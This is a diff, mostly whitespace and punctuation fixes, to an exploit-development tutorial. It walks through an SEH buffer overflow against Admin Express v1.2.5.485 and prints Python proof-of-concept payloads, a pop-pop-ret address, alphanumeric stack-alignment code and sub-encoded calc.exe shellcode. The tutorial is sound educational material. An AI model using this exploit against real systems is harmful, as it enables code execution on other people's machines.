@@ -61,9 +61,9 @@ root@kali:~/ADMIN_EXPRESS/POC# cat poc.py
 # Proof of Concept - Admin Express v1.2.5.485 Exploit
 
 payload = "\x41" * 4260
-payload += "\x42\x42\x42\x42" 		# nSEH
-payload += "\x43\x43\x43\x43"		# SEH
-payload += "\x41" * (5000-len(payload))	# The remaining bytes to create the crash
+payload += "\x42\x42\x42\x42"     # nSEH
+payload += "\x43\x43\x43\x43"   # SEH
+payload += "\x41" * (5000-len(payload)) # The remaining bytes to create the crash
 
 print payload
 
@@ -91,10 +91,10 @@ root@kali:~/ADMIN_EXPRESS/POC# cat poc.py
 # Proof of Concept - Admin Express v1.2.5.485 Exploit
 
 payload = "\x41" * 4260
-payload += "\xeb\x06\x90\x90" 		# Short jump 6 bytes into C buffer
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
-payload += "\x43" * (5000-len(payload))	# The remaining bytes to create the crash. Changed to C's to differentiate
-					# between 1st and last buffer.
+payload += "\xeb\x06\x90\x90"     # Short jump 6 bytes into C buffer
+payload += "\x42\x4c\x01\x10"   # 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x43" * (5000-len(payload)) # The remaining bytes to create the crash. Changed to C's to differentiate
+          # between 1st and last buffer.
 
 print payload
 
@@ -170,8 +170,8 @@ root@kali:~/ADMIN_EXPRESS/POC# cat poc.py
 
 
 payload = "\x41" * 4260
-payload += "\x70\x7e\x71\x7e" 		# JO 126 hex bytes. If jump fails, default to JNO 126 hex bytes
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x70\x7e\x71\x7e"     # JO 126 hex bytes. If jump fails, default to JNO 126 hex bytes
+payload += "\x42\x4c\x01\x10"   # 0x10014c42 pop pop ret wmiwrap.DLL
 payload += "\x43" * (5000-len(payload))
 
 print payload
@@ -196,18 +196,18 @@ root@kali:~/ADMIN_EXPRESS/POC# cat poc.py
 # Proof of Concept - Admin Express v1.2.5.485 Exploit
 
 payload = "\x41" * 4260
-payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x70\x7e\x71\x7e"   # JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"   # 0x10014c42 pop pop ret wmiwrap.DLL
 
 # There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
 # so we have enough room for our shellcode and to decode.
-payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 122     # add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
-payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += "\x70\x79\x71\x79"   # JO or JNO only 121 bytes
+payload += "\x41" * 121     # NOP is in the restricted characters. Using \x41 as a slide into alignment
 payload += "\x43" * (5000-len(payload))
 ```
 
@@ -267,18 +267,18 @@ restore += "\x51"                       # push ecx; (to get the value on the sta
 
 # All togther now.
 payload = "\x41" * 4260
-payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x70\x7e\x71\x7e"   # JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"   # 0x10014c42 pop pop ret wmiwrap.DLL
 
 # There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
 # so we have enough room for our shellcode and to decode.
-payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 122     # add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
-payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += "\x70\x79\x71\x79"   # JO or JNO only 121 bytes
+payload += "\x41" * 121     # NOP is in the restricted characters. Using \x41 as a slide into alignment
 payload += restore
 payload += "\x43" * (5000-len(payload))
 
@@ -310,7 +310,7 @@ You may be asking yourself at this point why we need EAX. Why do we need to use 
 
 Alphanumeric Encoding
 ---
-Before anything, let's choose the new location of ESP. If we scroll down to the end of the buffer of `C's`, our last available address is `0012F3F7`. We will use `0012F3F4`. In the end, it will be `0012F3F0` that we will use, because four bytes get lost with all the stack manipulation going on- but we will use `0012F3F4` for our calculations:
+Before anything, let's choose the new location of ESP. If we scroll down to the end of the buffer of `C's`, our last available address is `0012F3F7`. We will use `0012F3F4`. In the end, it will be `0012F3F0` that we will use, because four bytes get lost with all the stack manipulation going on - but we will use `0012F3F4` for our calculations:
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/19.png" alt="">
 
@@ -330,9 +330,9 @@ If you subtract the two values above, you will get a difference of:
 FF FF E8 A4
 ```
 
-You will notice I do this differently later on. For memory addresses, I do not flip any of the bits. This is because it helps me, with a mental note. This does not make sense now, but later it will. When I do hexadecimal math for alphanumeric encoding of instructions that will form opcodes, I flip the bits so I can use [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html) format in the end when I am inputting the bits into my program. It is just a mental thing for me that I use to keep everything straight. It is just a preference of mine- you can do as you please.
+You will notice I do this differently later on. For memory addresses, I do not flip any of the bits. This is because it helps me, with a mental note. This does not make sense now, but later it will. When I do hexadecimal math for alphanumeric encoding of instructions that will form opcodes, I flip the bits so I can use [little endian](https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html) format in the end when I am inputting the bits into my program. It is just a mental thing for me that I use to keep everything straight. It is just a preference of mine - you can do as you please.
 
-Carrying on- we need to list the bits in vertical order:
+Carrying on - we need to list the bits in vertical order:
 
 ```console
 FF
@@ -413,7 +413,7 @@ After these instructions, we begin commencement of our subtraction math. After t
 1. `push eax` - EAX contains the value of the `0012F3F0`, which is where we want our stack pointer value to be, since we will be writing our shellcode up the stack, to lower memory addresses.
 2. `pop esp` - this will pop the value of EAX (`0012F3F0`) into the stack pointer.
 
-One thing before we start- `\x2d` is the opcode for `sub eax`, which is subtracting from EAX.
+One thing before we start - `\x2d` is the opcode for `sub eax`, which is subtracting from EAX.
 
 After all these instructions are executed, we can begin writing our shellcode to the stack! Here is the updated PoC, at this point:
 
@@ -430,7 +430,7 @@ restore += "\x51"                       # push ecx; (to get the value on the sta
 
 # Stack alignment
 # Need to make ESP 0x012F3F4. Using sub method to write that value onto the stack.
-# After making ESP 0x012F3F4, it should be the same value as EAX- so we can write up the stack.
+# After making ESP 0x012F3F4, it should be the same value as EAX - so we can write up the stack.
 alignment = "\x54" # push esp
 alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
 
@@ -439,26 +439,26 @@ alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
 # other operations, I used little endian. If you do all of the calculations in one way, you do not need to flip the sub
 # math difference results. This is how I keep things straight
 # 384D5555 364D5555 364E5555
-alignment += "\x2d\x38\x4d\x55\x55" 	# sub eax, 0x384D5555
-alignment += "\x2d\x36\x4d\x55\x55" 	# sub eax, 0x364D5555
-alignment += "\x2d\x36\x4e\x55\x55"	# sub eax, 0x364E5555
-alignment += "\x50" 		   	# push eax
-alignment += "\x5c" 			# pop esp; (puts the value of eax back into esp)
+alignment += "\x2d\x38\x4d\x55\x55"   # sub eax, 0x384D5555
+alignment += "\x2d\x36\x4d\x55\x55"   # sub eax, 0x364D5555
+alignment += "\x2d\x36\x4e\x55\x55" # sub eax, 0x364E5555
+alignment += "\x50"         # push eax
+alignment += "\x5c"       # pop esp; (puts the value of eax back into esp)
 
 # All together now.
 payload = "\x41" * 4260
-payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x70\x7e\x71\x7e"   # JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"   # 0x10014c42 pop pop ret wmiwrap.DLL
 
 # There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
 # so we have enough room for our shellcode and to decode.
-payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 122     # add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
-payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += "\x70\x79\x71\x79"   # JO or JNO only 121 bytes
+payload += "\x41" * 121     # NOP is in the restricted characters. Using \x41 as a slide into alignment
 payload += restore
 payload += alignment
 payload += "\x43" * (5000-len(payload))
@@ -507,7 +507,7 @@ But what if our shellcode was this:
 "\x00"
 ```
 
-We would have to add three NOPs, to fill out the four bytes needed in the register. But remember something here- NOPs are in our restricted character set! We can actually use `A`'s, `B`'s, or `C`'s to accomplish the same thing. Just remember that each of those three letters actual increment some of the general-purpose registers. Don't forget that if your shellcode is relying on some of those same registers to do some calculations!
+We would have to add three NOPs, to fill out the four bytes needed in the register. But remember something here - NOPs are in our restricted character set! We can actually use `A`'s, `B`'s, or `C`'s to accomplish the same thing. Just remember that each of those three letters actual increment some of the general-purpose registers. Don't forget that if your shellcode is relying on some of those same registers to do some calculations!
 
 To get our shellcode on the stack, you would do the exact same method as above, but you would first zero out the EAX register. Then, the three lines of SUB statements would be executed after the AND statement, and then pushed onto the stack. We keep hearing me say "zero out the register". How exactly do we do this? Generally, you would use bitwise `XOR`. If you `XOR` a register with itself, the value of the register turns to all `0`'s. You can achieve the same thing with bitwise `AND`. Instead of using the register itself, you can use a string of `0`'s and `1`'s, and then perform another `AND` operation, with the inverse of those bits. This will be reflected in the updated PoC shortly. One other thing to note is that the opcode of `and eax` is `\x25`.
 
@@ -617,7 +617,7 @@ restore += "\x51"                       # push ecx; (to get the value on the sta
 
 # Stack alignment
 # Need to make ESP 0x012F3F4. Using sub method to write that value onto the stack.
-# After making ESP 0x012F3F4, it should be the same value as EAX- so we can write up the stack.
+# After making ESP 0x012F3F4, it should be the same value as EAX - so we can write up the stack.
 alignment = "\x54" # push esp
 alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
 
@@ -626,55 +626,55 @@ alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
 # other operations, I used little endian. If you do all of the calculations in one way, you do not need to flip the sub
 # math difference results. This is how I keep things straight
 # 384D5555 364D5555 364E5555
-alignment += "\x2d\x38\x4d\x55\x55" 	# sub eax, 0x384D5555
-alignment += "\x2d\x36\x4d\x55\x55" 	# sub eax, 0x364D5555
-alignment += "\x2d\x36\x4e\x55\x55"	# sub eax, 0x364E5555
-alignment += "\x50" 		   	# push eax
-alignment += "\x5c" 			# pop esp; (puts the value of eax back into esp)
+alignment += "\x2d\x38\x4d\x55\x55"   # sub eax, 0x384D5555
+alignment += "\x2d\x36\x4d\x55\x55"   # sub eax, 0x364D5555
+alignment += "\x2d\x36\x4e\x55\x55" # sub eax, 0x364E5555
+alignment += "\x50"         # push eax
+alignment += "\x5c"       # pop esp; (puts the value of eax back into esp)
 
 # calc.exe shellcode, via the sub method. Values needed are as followed. Reference the calc.exe shellcode line for line numbers.
 # 1st line = 2C552D14 01552D14 01562E16
 shellcode = zero
-shellcode += "\x2d\x14\x2d\x55\x2c" 	# sub eax, 0x2C552D14
-shellcode += "\x2d\x14\x2d\x55\x01" 	# sub eax, 0x01562D14
-shellcode += "\x2d\x16\x2e\x56\x01" 	# sub eax, 0x01562E16
-shellcode += "\x50" 		    	# push eax; (get the value on the stack). We will do this for all remaining steps like this one.
+shellcode += "\x2d\x14\x2d\x55\x2c"   # sub eax, 0x2C552D14
+shellcode += "\x2d\x14\x2d\x55\x01"   # sub eax, 0x01562D14
+shellcode += "\x2d\x16\x2e\x56\x01"   # sub eax, 0x01562E16
+shellcode += "\x50"           # push eax; (get the value on the stack). We will do this for all remaining steps like this one.
 
 # 2nd line = 24121729 24121739 2414194A
 shellcode += zero
-shellcode += "\x2d\x29\x17\x12\x24" 	# sub eax, 0x24121729
+shellcode += "\x2d\x29\x17\x12\x24"   # sub eax, 0x24121729
 shellcode += "\x2d\x39\x17\x12\x24"     # sub eax, 0x24121739
 shellcode += "\x2d\x4a\x19\x14\x24"     # sub eax, 0x2414194A (was 40 at the end, but a miscalc happened. Changed to 4A)
-shellcode += "\x50" 			# push eax
+shellcode += "\x50"       # push eax
 
 # 3rd line = 34313635 34313434 34313434
 shellcode += zero
-shellcode += "\x2d\x35\x36\x31\x34" 	# sub eax, 0x34313635
-shellcode += "\x2d\x34\x34\x31\x34" 	# sub eax, 0x34313434
-shellcode += "\x2d\x34\x34\x31\x34" 	# sub eax, 0x34313434
-shellcode += "\x50" 			# push eax
+shellcode += "\x2d\x35\x36\x31\x34"   # sub eax, 0x34313635
+shellcode += "\x2d\x34\x34\x31\x34"   # sub eax, 0x34313434
+shellcode += "\x2d\x34\x34\x31\x34"   # sub eax, 0x34313434
+shellcode += "\x50"       # push eax
 
 # 4th line = 323A1245 323A1245 333A1245
 shellcode += zero
-shellcode += "\x2d\x45\x12\x3a\x32" 	# sub eax, 0x323A1245
-shellcode += "\x2d\x45\x12\x3a\x32" 	# sub eax, 0x323A1245
-shellcode += "\x2d\x45\x12\x3a\x33" 	# sub eax, 0x333A1245
-shellcode += "\x50" 		    	# push eax
+shellcode += "\x2d\x45\x12\x3a\x32"   # sub eax, 0x323A1245
+shellcode += "\x2d\x45\x12\x3a\x32"   # sub eax, 0x323A1245
+shellcode += "\x2d\x45\x12\x3a\x33"   # sub eax, 0x333A1245
+shellcode += "\x50"           # push eax
 
 # All together now.
 payload = "\x41" * 4260
-payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
-payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x70\x7e\x71\x7e"   # JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"   # 0x10014c42 pop pop ret wmiwrap.DLL
 
 # There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
 # so we have enough room for our shellcode and to decode.
-payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 122     # add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x70\x7e\x71\x7e"   # JO or JNO another 126 bytes, so shellcode can decode
 payload += "\x41" * 124
-payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
-payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+payload += "\x70\x79\x71\x79"   # JO or JNO only 121 bytes
+payload += "\x41" * 121     # NOP is in the restricted characters. Using \x41 as a slide into alignment
 payload += restore
 payload += alignment
 payload += shellcode
@@ -710,7 +710,7 @@ We step through the rest of the instructions. After doing that, you can scroll d
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/xor.png" alt="">
 
-I still cannot figure out exactly why, but if I did not restore the original stack pointer, the shellcode broke. The shellcode seems to need one instruction executed before the call to ```msvcrt.system``` occurs, in order for the application not to trip over itself. As conveluted as it may sound, this is the best rationale I can come up. If anyone has any better information on this- PLEASE LET ME KNOW! My contact information is available on the [homepage](https://connormcgarr.github.io).
+I still cannot figure out exactly why, but if I did not restore the original stack pointer, the shellcode broke. The shellcode seems to need one instruction executed before the call to ```msvcrt.system``` occurs, in order for the application not to trip over itself. As convoluted as it may sound, this is the best rationale I can come up. If anyone has any better information on this - PLEASE LET ME KNOW! My contact information is available on the [homepage](https://connormcgarr.github.io).
 
 Recall from above that we saved the old stack pointer in ECX. We can use another subtraction method to do this. We will use a `MOV` instruction to move ECX into ESP. 
 
@@ -760,7 +760,7 @@ restore += "\x51" # push ecx; (to get the value on the stack for the mov esp com
 
 # Stack alignment
 # Need to make ESP 0x012F3F4. Using sub method to write that value onto the stack.
-# After making ESP 0x012F3F4, it should be the same value as EAX- so we can write up the stack.
+# After making ESP 0x012F3F4, it should be the same value as EAX - so we can write up the stack.
 alignment = "\x54" # push esp
 alignment += "\x58" # pop eax; (puts the value of ESP into EAX)
 
